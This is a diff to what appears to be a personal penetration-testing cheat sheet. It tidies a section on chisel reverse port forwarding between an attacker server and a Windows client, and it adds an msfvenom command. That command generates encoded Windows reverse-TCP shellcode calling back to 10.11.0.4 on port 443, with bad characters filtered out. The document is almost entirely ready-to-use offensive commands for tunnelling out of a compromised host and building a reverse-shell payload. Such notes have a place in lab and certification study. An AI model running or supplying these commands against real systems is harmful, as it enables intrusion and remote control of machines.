@@ -98,8 +98,16 @@ python cracker?
 
 
 ## chisel
-*nix local
+\*nix local
 `./chisel server --reverse -p 9001`
 
 win remote
 `./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`
+
+
+
+## msfvenom
+
+generate shellcode, filtering out bad characters
+````
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
